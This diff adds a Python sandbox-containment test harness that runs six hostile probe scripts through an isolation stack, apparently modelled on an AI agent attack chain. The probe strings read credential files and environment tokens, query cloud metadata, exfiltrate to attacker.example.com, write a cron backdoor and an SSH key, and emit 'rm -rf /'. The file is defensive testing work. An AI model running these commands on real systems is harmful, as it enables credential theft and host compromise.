@@ -1,0 +1,988 @@
+#!/usr/bin/env python3
+"""Cinder Incident Gate — real containment probes through the Cindermote stack.
+
+Each probe creates a hostile Python script that simulates one step of the
+July 2026 OpenAI/Hugging Face attack chain, then detonates it through the
+real S0-S4 sandbox (namespace isolation, chroot, seccomp, ptrace, capability
+drop, cgroups).  The host-generated receipt proves whether containment held.
+
+The probes are harmless: they attempt socket connections, file reads, and
+environment lookups that the real sandbox must block.  No zero-day details
+are recreated.  The verdicts come from host-observed evidence, not from
+self-reported guest strings.
+"""
+
+from __future__ import annotations
+
+import argparse
+import contextlib
+import datetime as dt
+import hashlib
+import json
+import os
+import shutil
+import sys
+import tempfile
+import threading
+import uuid
+from dataclasses import dataclass
+from pathlib import Path
+from typing import Any
+
+THIS_FILE = Path(__file__).resolve()
+PROJECT_DIR = THIS_FILE.parent
+if str(PROJECT_DIR) not in sys.path:
+    sys.path.insert(0, str(PROJECT_DIR))
+
+import cindermote.mote.detonate as detonate_module
+from canaries.registry import instantiate_probes
+
+SNAPSHOT_MANIFEST_PATH = detonate_module.SNAPSHOT_MANIFEST_PATH
+SNAPSHOT_PATH = detonate_module.SNAPSHOT_PATH
+bootstrap_snapshot = detonate_module.bootstrap_snapshot
+verify_snapshot = detonate_module.verify_snapshot
+
+RISK_RANK = {
+    "unknown": -1,
+    "benign": 0,
+    "suspicious": 1,
+    "hostile": 2,
+}
+DEFAULT_RUNS_DIR = PROJECT_DIR / "receipts" / "incident-gate"
+_EVIDENCE_LOCK = threading.RLock()
+
+
+# ---------------------------------------------------------------------------
+# Attack chain probes — each returns the Python source for a hostile payload
+# ---------------------------------------------------------------------------
+
+# Step 1: Agent receives constrained package-registry access and abuses it
+# by attempting to import packages and reach external registries directly.
+PROBE_REGISTRY_PROXY_ABUSE = """\
+\"\"\"Probe: attempt direct PyPI / npm registry access via HTTP + DNS.\"\"\"
+import socket
+import urllib.request
+
+targets = [
+    ("pypi.org", 443),
+    ("registry.npmjs.org", 443),
+    ("files.pythonhosted.org", 443),
+]
+for host, port in targets:
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(2)
+        s.connect((host, port))
+        s.close()
+    except Exception:
+        pass
+
+# Attempt HTTP-level package fetch
+try:
+    urllib.request.urlopen("https://pypi.org/simple/requests/", timeout=2)
+except Exception:
+    pass
+
+print("registry_probe_complete")
+"""
+
+# Step 2: Privilege escalation / lateral movement — attempt to reach
+# private network ranges, unshare namespaces, and access privileged paths.
+PROBE_LATERAL_MOVEMENT = """\
+\"\"\"Probe: lateral movement via private-network and namespace escape.\"\"\"
+import os
+import socket
+
+# Attempt lateral connections to private ranges
+targets = [
+    ("192.168.1.1", 22),
+    ("10.0.0.1", 80),
+    ("172.16.0.1", 443),
+]
+for host, port in targets:
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(1)
+        s.connect((host, port))
+        s.close()
+    except Exception:
+        pass
+
+# Attempt namespace escape
+try:
+    os.system("unshare -U /bin/sh -c 'echo escaped'")
+except Exception:
+    pass
+
+# Attempt to read host /etc/shadow
+try:
+    with open("/etc/shadow") as f:
+        f.read()
+except Exception:
+    pass
+
+print("lateral_probe_complete")
+"""
+
+# Step 3: Cloud metadata service access — the classic SSRF vector.
+PROBE_METADATA_ACCESS = """\
+\"\"\"Probe: attempt cloud metadata endpoint and link-local access.\"\"\"
+import socket
+
+# AWS metadata service
+targets = [
+    ("169.254.169.254", 80),
+    ("169.254.169.254", 443),
+    # GCP metadata
+    ("metadata.google.internal", 80),
+    # Azure metadata
+    ("169.254.169.254", 8080),
+]
+for host, port in targets:
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(1)
+        s.connect((host, port))
+        s.close()
+    except Exception:
+        pass
+
+# Attempt HTTP-level metadata fetch
+import urllib.request
+try:
+    urllib.request.urlopen(
+        "http://169.254.169.254/latest/meta-data/", timeout=1
+    )
+except Exception:
+    pass
+
+print("metadata_probe_complete")
+"""
+
+# Step 4: Credential harvesting — look for ambient credentials.
+PROBE_CREDENTIAL_HARVEST = """\
+\"\"\"Probe: harvest ambient credentials from standard locations.\"\"\"
+import os
+
+# Check environment for leaked credentials
+env_targets = [
+    "AWS_ACCESS_KEY_ID",
+    "AWS_SECRET_ACCESS_KEY",
+    "OPENAI_API_KEY",
+    "GITHUB_TOKEN",
+    "HF_TOKEN",
+    "HUGGING_FACE_HUB_TOKEN",
+    "CINDERMOTE_HONEY_TOKEN",
+]
+found = {}
+for key in env_targets:
+    val = os.environ.get(key)
+    if val:
+        found[key] = val
+
+# Attempt filesystem credential files
+cred_paths = [
+    os.path.expanduser("~/.aws/credentials"),
+    os.path.expanduser("~/.ssh/id_rsa"),
+    os.path.expanduser("~/.config/gh/hosts.yml"),
+    "/home/mote/.aws/credentials",
+]
+for path in cred_paths:
+    try:
+        with open(path) as f:
+            found[path] = f.read()[:100]
+    except Exception:
+        pass
+
+print("credential_probe_complete")
+"""
+
+# Step 5: Arbitrary outbound network activity — data exfiltration.
+PROBE_OUTBOUND_EXFIL = """\
+\"\"\"Probe: arbitrary outbound connections (exfiltration attempt).\"\"\"
+import socket
+
+# Attempt DNS exfiltration
+try:
+    socket.getaddrinfo("exfil.attacker.example.com", 53)
+except Exception:
+    pass
+
+# Attempt direct TCP to external hosts
+targets = [
+    ("1.1.1.1", 53),
+    ("8.8.8.8", 53),
+    ("93.184.216.34", 80),  # example.com
+]
+for host, port in targets:
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(1)
+        s.connect((host, port))
+        s.send(b"EXFILTRATED_DATA")
+        s.close()
+    except Exception:
+        pass
+
+# Attempt UDP exfiltration
+try:
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.sendto(b"stolen_data", ("1.1.1.1", 53))
+    s.close()
+except Exception:
+    pass
+
+print("exfiltration_probe_complete")
+"""
+
+# Step 6: Tainted output — attempt to inject host-side commands.
+PROBE_TAINTED_OUTPUT = """\
+\"\"\"Probe: produce tainted output with embedded shell commands.\"\"\"
+import json
+import os
+import subprocess
+
+# Attempt to run host commands directly
+try:
+    subprocess.run(["curl", "-X", "POST", "http://attacker.example.com/steal",
+                     "-d", "data=stolen"], timeout=2)
+except Exception:
+    pass
+
+# Attempt to write a cron job
+try:
+    with open("/etc/cron.d/backdoor", "w") as f:
+        f.write("* * * * * root curl http://attacker.example.com/c2\\n")
+except Exception:
+    pass
+
+# Attempt to modify the host's authorized_keys
+try:
+    with open(os.path.expanduser("~/.ssh/authorized_keys"), "a") as f:
+        f.write("ssh-rsa AAAA_ATTACKER_KEY attacker@c2\\n")
+except Exception:
+    pass
+
+# Emit "tainted" JSON output designed to trick a naive wrapper
+output = {
+    "status": "complete",
+    "__exec__": "rm -rf /",
+    "eval": "__import__('os').system('whoami')",
+}
+print(json.dumps(output))
+"""
+
+
+# ---------------------------------------------------------------------------
+# Probe definitions
+# ---------------------------------------------------------------------------
+
+@dataclass(frozen=True)
+class CinderProbe:
+    """One step of the attack chain to detonate."""
+    name: str
+    description: str
+    source: str
+    # What finding rules the sandbox should trigger
+    expected_risk: str  # "hostile" or "suspicious"
+    expected_decision: str  # "DENY" or "ALLOW"
+    # Specific detector rules that should fire
+    expected_rules: frozenset[str]
+
+
+_INCIDENT_PROBE_ORDER = {
+    name: index
+    for index, name in enumerate(
+        (
+            "registry_proxy_abuse",
+            "lateral_movement",
+            "metadata_access",
+            "credential_harvest",
+            "outbound_exfil",
+            "tainted_output",
+        )
+    )
+}
+
+
+def load_discovered_probes() -> list[CinderProbe]:
+    """Translate non-benign registry probes into the incident-gate contract."""
+    probes: list[CinderProbe] = []
+    for probe in instantiate_probes():
+        expectation = probe.expectation
+        if expectation.risk == "benign":
+            continue
+        probes.append(
+            CinderProbe(
+                name=probe.name,
+                description=probe.description,
+                source=probe.source,
+                expected_risk=expectation.risk,
+                expected_decision=expectation.decision,
+                expected_rules=expectation.rules,
+            )
+        )
+    probes.sort(
+        key=lambda probe: (
+            _INCIDENT_PROBE_ORDER.get(probe.name, len(_INCIDENT_PROBE_ORDER)),
+            probe.name,
+        )
+    )
+    return probes
+
+
+CINDER_PROBES = load_discovered_probes()
+
+
+# ---------------------------------------------------------------------------
+# Incident Gate runner
+# ---------------------------------------------------------------------------
+
+@dataclass
+class ProbeResult:
+    """Result of detonating one probe through the real Cindermote stack."""
+    name: str
+    description: str
+    receipt: dict[str, Any]
+    containment_held: bool
+    observed_risk: str
+    observed_decision: str
+    observed_rules: set[str]
+    expected_risk: str
+    expected_decision: str
+    expected_rules: frozenset[str]
+    isolation_confirmed: bool
+    purge_verified: bool
+    error: str | None = None
+    observation_status: str = "EVALUATION_INCOMPLETE"
+
+
+def _ensure_snapshot() -> None:
+    """Bootstrap the golden snapshot if not already present."""
+    if not SNAPSHOT_PATH.exists() or not SNAPSHOT_MANIFEST_PATH.exists():
+        bootstrap_snapshot()
+    verify_snapshot()
+
+
+@dataclass(frozen=True)
+class EvidencePaths:
+    """Per-run host evidence directories. Never aliases repository-global state."""
+
+    root: Path
+    receipts: Path
+    quarantine: Path
+    alerts: Path
+
+
+def _create_evidence_paths(root: Path) -> EvidencePaths:
+    """Create one isolated, private evidence tree without deleting prior evidence."""
+    root = Path(root)
+    if root.is_symlink():
+        raise ValueError(f"evidence root must not be a symlink: {root}")
+    root.mkdir(parents=True, mode=0o700, exist_ok=True)
+    try:
+        root.chmod(0o700)
+    except OSError:
+        pass
+
+    paths = EvidencePaths(
+        root=root,
+        receipts=root / "receipts",
+        quarantine=root / "quarantine",
+        alerts=root / "alerts",
+    )
+    for directory in (paths.receipts, paths.quarantine, paths.alerts):
+        if directory.is_symlink():
+            raise ValueError(f"evidence directory must not be a symlink: {directory}")
+        directory.mkdir(mode=0o700, exist_ok=True)
+        try:
+            directory.chmod(0o700)
+        except OSError:
+            pass
+    return paths
+
+
+@contextlib.contextmanager
+def _detonation_evidence_scope(paths: EvidencePaths):
+    """Temporarily route detonation output into one run-owned evidence tree."""
+    with _EVIDENCE_LOCK:
+        previous = (
+            detonate_module.RECEIPTS_DIR,
+            detonate_module.QUARANTINE_DIR,
+            detonate_module.ALERTS_DIR,
+        )
+        detonate_module.RECEIPTS_DIR = paths.receipts
+        detonate_module.QUARANTINE_DIR = paths.quarantine
+        detonate_module.ALERTS_DIR = paths.alerts
+        try:
+            yield
+        finally:
+            (
+                detonate_module.RECEIPTS_DIR,
+                detonate_module.QUARANTINE_DIR,
+                detonate_module.ALERTS_DIR,
+            ) = previous
+
+
+def _atomic_write_text(path: Path, payload: str) -> None:
+    path.parent.mkdir(parents=True, exist_ok=True)
+    temporary = path.with_name(f".{path.name}.{uuid.uuid4().hex}.tmp")
+    descriptor = os.open(
+        temporary,
+        os.O_WRONLY | os.O_CREAT | os.O_EXCL,
+        0o600,
+    )
+    try:
+        os.write(descriptor, payload.encode("utf-8"))
+        os.fsync(descriptor)
+    finally:
+        os.close(descriptor)
+    os.replace(temporary, path)
+
+
+def _evaluate_receipt(probe: CinderProbe, receipt: dict[str, Any]) -> ProbeResult:
+    outward = receipt.get("outward_report", {})
+    gate = receipt.get("gate", {})
+    isolation = receipt.get("isolation", {})
+    purge = receipt.get("purge", {})
+    findings = receipt.get("detector_findings", [])
+
+    observed_risk = outward.get("risk_level", "unknown")
+    observed_decision = gate.get("final_decision", "UNKNOWN")
+    observed_rules = {
+        finding.get("rule_id")
+        for finding in findings
+        if isinstance(finding, dict) and isinstance(finding.get("rule_id"), str)
+    }
+
+    isolation_confirmed = (
+        isolation.get("namespace_used") is True
+        and isolation.get("seccomp_loaded") is True
+    )
+    purge_verified = purge.get("verified_externally") is True
+
+    # Containment can only be claimed from a completed payload observation;
+    # an incomplete one is reported separately, never as execution coverage.
+    observation = receipt.get("observation", {})
+    observation_status = (
+        observation.get("status", "EVALUATION_INCOMPLETE")
+        if isinstance(observation, dict)
+        else "EVALUATION_INCOMPLETE"
+    )
+
+    if observation_status != "COMPLETE":
+        observation_status = "EVALUATION_INCOMPLETE"
+
+    expected_rank = RISK_RANK.get(probe.expected_risk)
+    observed_rank = RISK_RANK.get(observed_risk, -1)
+    risk_ok = expected_rank is not None and observed_rank >= expected_rank
+    decision_ok = observed_decision == probe.expected_decision
+    rules_ok = probe.expected_rules.issubset(observed_rules)
+    containment_held = (
+        risk_ok
+        and decision_ok
+        and rules_ok
+        and isolation_confirmed
+        and purge_verified
+        and observation_status == "COMPLETE"
+        and receipt.get("telemetry_incomplete") is False
+    )
+
+    return ProbeResult(
+        name=probe.name,
+        description=probe.description,
+        receipt=receipt,
+        containment_held=containment_held,
+        observed_risk=observed_risk,
+        observed_decision=observed_decision,
+        observed_rules=observed_rules,
+        expected_risk=probe.expected_risk,
+        expected_decision=probe.expected_decision,
+        expected_rules=probe.expected_rules,
+        isolation_confirmed=isolation_confirmed,
+        purge_verified=purge_verified,
+        observation_status=observation_status,
+    )
+
+
+def _run_probe_scoped(probe: CinderProbe, paths: EvidencePaths) -> ProbeResult:
+    with tempfile.TemporaryDirectory(
+        prefix="cindermote-cinder-artifact-",
+        dir=paths.root,
+    ) as directory:
+        artifact = Path(directory) / f"{probe.name}.py"
+        artifact.write_text(probe.source, encoding="utf-8")
+
+        try:
+            with _detonation_evidence_scope(paths):
+                receipt = detonate_module.detonate(
+                    artifact,
+                    "python-script",
+                    submitted_by="cinder-incident-gate",
+                )
+        except Exception as exc:
+            return ProbeResult(
+                name=probe.name,
+                description=probe.description,
+                receipt={},
+                containment_held=False,
+                observed_risk="unknown",
+                observed_decision="ERROR",
+                observed_rules=set(),
+                expected_risk=probe.expected_risk,
+                expected_decision=probe.expected_decision,
+                expected_rules=probe.expected_rules,
+                isolation_confirmed=False,
+                purge_verified=False,
+                error=f"{type(exc).__name__}: {exc}",
+                observation_status="EVALUATION_INCOMPLETE",
+            )
+
+    return _evaluate_receipt(probe, receipt)
+
+
+def run_probe(
+    probe: CinderProbe,
+    *,
+    evidence_root: Path | None = None,
+) -> ProbeResult:
+    """Detonate one probe without mutating repository-global evidence directories."""
+    if evidence_root is None:
+        with tempfile.TemporaryDirectory(prefix="cindermote-incident-gate-") as directory:
+            return _run_probe_scoped(probe, _create_evidence_paths(Path(directory)))
+    return _run_probe_scoped(probe, _create_evidence_paths(evidence_root))
+
+
+def run_all_probes(
+    probes: list[CinderProbe] | None = None,
+    *,
+    evidence_root: Path | None = None,
+) -> list[ProbeResult]:
+    """Run probes in a unique evidence tree; prior evidence is never deleted."""
+    if probes is None:
+        probes = CINDER_PROBES
+    _ensure_snapshot()
+
+    if evidence_root is None:
+        with tempfile.TemporaryDirectory(prefix="cindermote-incident-gate-") as directory:
+            paths = _create_evidence_paths(Path(directory))
+            return [_run_probe_scoped(probe, paths) for probe in probes]
+
+    paths = _create_evidence_paths(evidence_root)
+    return [_run_probe_scoped(probe, paths) for probe in probes]
+
+
+def _new_run_root(base: Path) -> Path:
+    timestamp = dt.datetime.now(dt.timezone.utc).strftime("%Y%m%dT%H%M%SZ")
+    return base / f"run-{timestamp}-{uuid.uuid4().hex[:8]}"
+
+
+def _file_sha256(path: Path) -> str:
+    digest = hashlib.sha256()
+    with path.open("rb") as handle:
+        for chunk in iter(lambda: handle.read(1024 * 1024), b""):
+            digest.update(chunk)
+    return digest.hexdigest()
+
+
+# ---------------------------------------------------------------------------
+# Doctor — preflight check using the real infrastructure
+# ---------------------------------------------------------------------------
+
+def _kvm_usable() -> bool:
+    return os.access("/dev/kvm", os.R_OK | os.W_OK)
+
+
+def run_doctor() -> dict[str, Any]:
+    """Check system readiness using real infrastructure checks.
+
+    ``overall_status`` is one of:
+
+    * ``READY`` - every check passes, including the isolation-strength controls
+      (root with a real cgroup v2 hierarchy, KVM, a ready Firecracker runtime).
+    * ``DEGRADED`` - the namespace gate can run, but at least one
+      isolation-strength control is missing. Receipts record the degraded mode.
+    * ``FAIL_PREREQUISITES_MISSING`` - the gate cannot run on this host.
+    """
+    checks: list[dict[str, Any]] = []
+    ready = True
+    euid = os.geteuid()
+
+    def add(name: str, ok: bool, detail: str, *, required: bool = True) -> None:
+        nonlocal ready
+        checks.append({"name": name, "ok": ok, "required": required, "detail": detail})
+        if required and not ok:
+            ready = False
+
+    # 1. Snapshot availability
+    snapshot_ok = SNAPSHOT_PATH.exists()
+    manifest_ok = SNAPSHOT_MANIFEST_PATH.exists()
+    add(
+        "golden_snapshot",
+        snapshot_ok and manifest_ok,
+        f"snapshot={SNAPSHOT_PATH.exists()}, manifest={SNAPSHOT_MANIFEST_PATH.exists()}",
+    )
+
+    # 2. Snapshot integrity
+    if snapshot_ok and manifest_ok:
+        try:
+            verify_snapshot()
+            add("snapshot_integrity", True, "verified")
+        except Exception as exc:
+            add("snapshot_integrity", False, str(exc))
+
+    # 3. KVM availability (strength control; not required for namespace mode)
+    kvm_ok = _kvm_usable()
+    add(
+        "kvm",
+        kvm_ok,
+        "/dev/kvm rw" if kvm_ok else "/dev/kvm unavailable (Firecracker profiles cannot run; namespace mode still works)",
+        required=False,
+    )
+
+    # 4. Required commands
+    for cmd in ("python3", "unshare"):
+        path = shutil.which(cmd)
+        add(f"command_{cmd}", path is not None, path or "missing")
+
+    # 5. Namespace support (user namespaces enabled)
+    try:
+        with open("/proc/sys/kernel/unprivileged_userns_clone") as f:
+            userns = f.read().strip() == "1"
+    except FileNotFoundError:
+        userns = True  # most kernels default to enabled
+    add("user_namespaces", userns, "enabled" if userns else "disabled")
+
+    # 6. seccomp support
+    seccomp_ok = Path("/proc/self/status").exists()
+    if seccomp_ok:
+        try:
+            status = Path("/proc/self/status").read_text()
+            seccomp_ok = "Seccomp:" in status
+        except Exception:
+            seccomp_ok = False
+    add("seccomp", seccomp_ok, "available" if seccomp_ok else "unavailable")
+
+    # 7. Cgroup v2. Root selects full-root mode, which requires real cgroup
+    # limits; non-root runs in degraded-user mode without them.
+    cgroup_ok = detonate_module.legacy_cgroup2_available()
+    if cgroup_ok:
+        cgroup_detail = "writable cgroup2 mount; limits are enforced"
+    elif euid != 0:
+        cgroup_detail = "not root: cgroup limits and mlock unavailable (degraded-user mode)"
+    else:
+        cgroup_detail = (
+            "root, but /sys/fs/cgroup is not a writable cgroup2 mount "
+            "(cgroup v1/hybrid host?); full-root mode would be denied"
+        )
+    add("cgroup_v2", cgroup_ok, cgroup_detail, required=euid == 0)
+
+    # 8. Cindermote observer key (created with mode 0600 on first run)
+    key_ok = (PROJECT_DIR / ".observer_key").exists()
+    add(
+        "observer_key",
+        True,
+        "present" if key_ok else "absent (created on first run)",
+        required=False,
+    )
+
+    # 9. Firecracker assets (for full VM mode)
+    try:
+        from cindermote.mote.firecracker_runtime import preflight_firecracker
+        fc_report = preflight_firecracker()
+        fc_ok = fc_report.ready
+        fc_detail = f"ready={fc_report.ready}, checks={len(fc_report.checks)}"
+    except Exception as exc:
+        fc_ok = False
+        fc_detail = f"unavailable: {type(exc).__name__}"
+    add(
+        "firecracker_runtime",
+        fc_ok,
+        f"{fc_detail} (namespace isolation does not require Firecracker)",
+        required=False,
+    )
+
+    degraded = [c["name"] for c in checks if not c["ok"] and not c["required"]]
+    if not ready:
+        overall = "FAIL_PREREQUISITES_MISSING"
+    elif degraded:
+        overall = "DEGRADED"
+    else:
+        overall = "READY"
+    return {
+        "timestamp": dt.datetime.now(dt.timezone.utc).isoformat(),
+        "overall_status": overall,
+        "isolation_mode": "full-root" if euid == 0 else "degraded-user",
+        "firecracker_available": fc_ok,
+        "degraded_checks": degraded,
+        "checks": checks,
+    }
+
+
+# ---------------------------------------------------------------------------
+# Report generation
+# ---------------------------------------------------------------------------
+
+def _overall_status(results: list[ProbeResult]) -> str:
+    if all(result.containment_held for result in results):
+        return "ALL_BOUNDARIES_HELD"
+    if any(not result.isolation_confirmed or not result.purge_verified for result in results):
+        return "BOUNDARY_FAILURE_DETECTED"
+    if any(result.error or result.observation_status != "COMPLETE" for result in results):
+        return "EVALUATION_INCOMPLETE"
+    return "CONTAINMENT_TEST_FAILED"
+
+
+def generate_report(results: list[ProbeResult]) -> str:
+    """Generate a Markdown report from probe results."""
+    lines = [
+        "# Cinder Incident Gate Report",
+        "",
+        "## Attack Chain Coverage",
+        "",
+        "Each probe below simulates one step of the July 2026 OpenAI/Hugging Face",
+        "attack chain and detonates it through the **real Cindermote S0-S4 sandbox**",
+        "(namespace isolation, chroot, seccomp, ptrace, capability drop).",
+        "",
+        "Verdicts come from host-observed evidence, not guest self-reports.",
+        "",
+    ]
+
+    overall_status = _overall_status(results)
+    overall_labels = {
+        "ALL_BOUNDARIES_HELD": "ALL BOUNDARIES HELD",
+        "BOUNDARY_FAILURE_DETECTED": "BOUNDARY FAILURE DETECTED",
+        "EVALUATION_INCOMPLETE": "EVALUATION INCOMPLETE — FAIL CLOSED",
+        "CONTAINMENT_TEST_FAILED": "CONTAINMENT TEST FAILED",
+    }
+    lines.append(f"**Overall: {overall_labels[overall_status]}**")
+    lines.append("")
+    lines.append("| Probe | Risk | Decision | Isolation | Purge | Held |")
+    lines.append("|-------|------|----------|-----------|-------|------|")
+
+    for r in results:
+        held = "✅" if r.containment_held else "❌"
+        iso = "✅" if r.isolation_confirmed else "❌"
+        purge = "✅" if r.purge_verified else "❌"
+        lines.append(
+            f"| {r.name} | {r.observed_risk} | {r.observed_decision} | {iso} | {purge} | {held} |"
+        )
+
+    lines.append("")
+    lines.append("## Detailed Results")
+    lines.append("")
+
+    for r in results:
+        lines.append(f"### {r.name}")
+        lines.append(f"**{r.description}**")
+        lines.append("")
+        if r.error:
+            lines.append(f"⚠️ Error: `{r.error}`")
+            lines.append("")
+            continue
+
+        lines.append(f"- Observed risk: `{r.observed_risk}` (expected: `{r.expected_risk}`)")
+        lines.append(f"- Gate decision: `{r.observed_decision}` (expected: `{r.expected_decision}`)")
+        if r.observation_status != "COMPLETE":
+            lines.append(
+                f"- ⚠️ Observation: `{r.observation_status}` — no completed payload "
+                "observation; this is not execution coverage"
+            )
+        lines.append(f"- Detector rules fired: `{sorted(r.observed_rules)}`")
+        if r.expected_rules:
+            missing = r.expected_rules - r.observed_rules
+            if missing:
+                lines.append(f"- ⚠️ Missing expected rules: `{sorted(missing)}`")
+        lines.append(f"- Namespace isolation: `{r.isolation_confirmed}`")
+        lines.append(f"- Seccomp loaded: `{r.receipt.get('isolation', {}).get('seccomp_loaded')}`")
+        lines.append(f"- Purge verified: `{r.purge_verified}`")
+
+        # Show canaries tripped
+        canaries = r.receipt.get("outward_report", {}).get("canaries_tripped", [])
+        if canaries:
+            lines.append(f"- Canaries tripped: `{canaries}`")
+
+        # Show destinations attempted
+        destinations = r.receipt.get("destinations_attempted", {})
+        if destinations:
+            for dest, disposition in sorted(destinations.items()):
+                lines.append(f"  - `{dest}` → `{disposition}`")
+
+        lines.append("")
+
+    lines.append("## Containment Proof")
+    lines.append("")
+    if overall_status == "ALL_BOUNDARIES_HELD":
+        lines.append("Every probe was detonated through the real Cindermote sandbox.")
+        lines.append("All hostile payloads were contained: network access was blocked by seccomp,")
+        lines.append("credential access was denied by chroot, namespace escape was prevented,")
+        lines.append("and all resources were verified as cleaned up after execution.")
+        lines.append("")
+        lines.append("The July 2026 attack chain would be interrupted at **every boundary**.")
+    elif overall_status == "BOUNDARY_FAILURE_DETECTED":
+        lines.append("❌ At least one directly observed isolation or purge boundary failed.")
+        lines.append("No containment claim is made; see the per-probe evidence above.")
+    elif overall_status == "EVALUATION_INCOMPLETE":
+        lines.append("⚠️ At least one payload observation did not complete, so this run is not")
+        lines.append("execution coverage. The gate failed closed and made no containment claim.")
+    else:
+        lines.append("❌ At least one completed probe did not satisfy its required risk,")
+        lines.append("decision, or detector-rule expectations. See the per-probe evidence above.")
+
+    return "\n".join(lines)
+
+
+# ---------------------------------------------------------------------------
+# CLI
+# ---------------------------------------------------------------------------
+
+def main(args: list[str] | None = None) -> int:
+    """CLI entry point for the Cinder Incident Gate."""
+    parser = argparse.ArgumentParser(
+        prog="cindermote incident-gate",
+        description="Cinder Incident Gate: containment probes through the real Cindermote stack",
+    )
+    subparsers = parser.add_subparsers(dest="command")
+
+    # run
+    run_parser = subparsers.add_parser("run", help="Run incident gate probes")
+    run_parser.add_argument(
+        "--case",
+        default="all",
+        help="Probe name or 'all' (default: all)",
+    )
+    run_parser.add_argument(
+        "--receipt-dir",
+        type=Path,
+        default=None,
+        help="Base directory for a unique append-only run tree (default: receipts/incident-gate/)",
+    )
+
+    # doctor
+    doctor_parser = subparsers.add_parser("doctor", help="Check system prerequisites")
+    doctor_parser.add_argument(
+        "--strict",
+        action="store_true",
+        help="Exit non-zero unless the host is READY (a DEGRADED host fails)",
+    )
+
+    parsed = parser.parse_args(args)
+
+    if parsed.command == "doctor":
+        report = run_doctor()
+        print(json.dumps(report, indent=2, sort_keys=True))
+        if report["overall_status"] == "READY":
+            print(f"\n✅ System is READY (isolation mode: {report['isolation_mode']})")
+            return 0
+        if report["overall_status"] == "DEGRADED":
+            print(
+                f"\n⚠️  System is DEGRADED (isolation mode: {report['isolation_mode']}). "
+                f"Missing strength controls: {', '.join(report['degraded_checks'])}. "
+                "The gate can run, but with reduced isolation; receipts record the mode."
+            )
+            return 1 if parsed.strict else 0
+        print("\n❌ Prerequisites missing. Fix the above issues.")
+        return 1
+
+    elif parsed.command == "run":
+        if parsed.case == "all":
+            probes = CINDER_PROBES
+        else:
+            probes = [p for p in CINDER_PROBES if p.name == parsed.case]
+            if not probes:
+                print(f"Unknown probe: {parsed.case}")
+                print(f"Available: {', '.join(p.name for p in CINDER_PROBES)}")
+                return 1
+
+        print(f"Running {len(probes)} Cinder Incident Gate probe(s)...")
+        print(f"Isolation mode: {'full-root' if os.geteuid() == 0 else 'degraded-user'}")
+        print()
+
+        base_dir = parsed.receipt_dir or DEFAULT_RUNS_DIR
+        run_root = _new_run_root(base_dir)
+        results = run_all_probes(probes, evidence_root=run_root)
+        paths = _create_evidence_paths(run_root)
+
+        child_receipts = []
+        for result in results:
+            job_id = result.receipt.get("identity", {}).get("job_id")
+            if not isinstance(job_id, str):
+                continue
+            child_path = paths.receipts / f"{job_id}.json"
+            if child_path.is_file():
+                child_receipts.append({
+                    "job_id": job_id,
+                    "path": str(child_path.relative_to(run_root)),
+                    "sha256": _file_sha256(child_path),
+                })
+
+        master = {
+            "gate": "cinder-incident-gate-v3",
+            "run_id": run_root.name,
+            "created_at": dt.datetime.now(dt.timezone.utc).isoformat(),
+            "evidence_root": str(run_root),
+            "probe_count": len(results),
+            "all_contained": all(r.containment_held for r in results),
+            "overall_status": _overall_status(results),
+            "child_receipts": child_receipts,
+            "results": [
+                {
+                    "name": r.name,
+                    "containment_held": r.containment_held,
+                    "observed_risk": r.observed_risk,
+                    "expected_risk": r.expected_risk,
+                    "observed_decision": r.observed_decision,
+                    "expected_decision": r.expected_decision,
+                    "observed_rules": sorted(r.observed_rules),
+                    "expected_rules": sorted(r.expected_rules),
+                    "isolation_confirmed": r.isolation_confirmed,
+                    "purge_verified": r.purge_verified,
+                    "observation_status": r.observation_status,
+                    "error": r.error,
+                    "job_id": r.receipt.get("identity", {}).get("job_id"),
+                }
+                for r in results
+            ],
+        }
+        master_path = run_root / "cinder-incident-gate.json"
+        _atomic_write_text(
+            master_path,
+            json.dumps(master, indent=2, sort_keys=True) + "\n",
+        )
+
+        report = generate_report(results)
+        report_path = run_root / "cinder-incident-gate-report.md"
+        _atomic_write_text(report_path, report + "\n")
+
+        # Print summary
+        for r in results:
+            status = "PASS" if r.containment_held else "FAIL"
+            print(f"  {status}  {r.name}: risk={r.observed_risk} decision={r.observed_decision}")
+            if r.error:
+                print(f"         ERROR: {r.error}")
+
+        print()
+        all_held = all(r.containment_held for r in results)
+        if all_held:
+            print(f"✅ All {len(results)} boundaries held. Evidence: {run_root}")
+        else:
+            failed = [r.name for r in results if not r.containment_held]
+            overall_status = _overall_status(results)
+            if overall_status == "BOUNDARY_FAILURE_DETECTED":
+                print(f"❌ Boundary failure detected in: {', '.join(failed)}")
+            elif overall_status == "EVALUATION_INCOMPLETE":
+                print(
+                    "⚠️ Evaluation incomplete; Cindermote failed closed for: "
+                    f"{', '.join(failed)}. Evidence: {run_root}"
+                )
+            else:
+                print(f"❌ Containment test failed in: {', '.join(failed)}")
+        return 0 if all_held else 1
+
+    else:
+        parser.print_help()
+        return 1
+
+
+if __name__ == "__main__":
+    sys.exit(main())
